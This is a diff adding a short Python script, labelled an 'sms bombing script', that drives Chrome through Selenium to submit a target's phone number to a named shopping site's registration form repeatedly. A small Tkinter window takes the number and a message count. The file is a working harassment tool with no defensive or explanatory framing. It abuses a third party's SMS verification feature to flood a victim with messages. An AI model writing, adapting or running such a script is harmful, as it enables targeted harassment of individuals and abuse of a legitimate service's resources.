@@ -1,0 +1,46 @@
+#sms bombing script
+import selenium
+from selenium.webdriver import Chrome
+from tkinter import Tk
+from tkinter import *
+from selenium.webdriver.chrome.options import Options
+
+#SELENIUM WORK
+def submit_no():
+    for i in range(int(SMS_Number_Entry.get())):
+        url = 'https://www.naaptol.com/'
+        driver = Chrome('C:/Program Files (x86)/Google/Chrome/Application/chromedriver')
+        r= driver.get(url)
+        driver.find_element_by_id('registration-panel-link').click()
+        driver.find_element_by_id('registration-basic-panel-mobile').send_keys(Mobile_number_Entry.get())
+        driver.find_element_by_id('registration-basic-panel-submit').click()
+
+
+
+
+
+#TKINTER WORK
+
+root = Tk()
+
+root.geometry("250x220")
+root.title('MP Transport')
+
+SMS_Number = Label(root, text='Enter msg Count.:', fg='blue')
+SMS_Number.place(x=20,y=30)
+
+SMS_Number_Entry = Entry(root)
+SMS_Number_Entry.place(x=20, y=50)
+
+Mobile_number = Label(root, text='mobile no without +91', fg='blue')
+Mobile_number.place(x=20, y=80)
+
+Mobile_number_Entry = Entry(root)
+Mobile_number_Entry.place(x=20, y=120)
+
+Submit_Button = Button(root, text='Submit', command=submit_no)
+Submit_Button.place(x=20, y=140)
+
+
+root.mainloop()
+
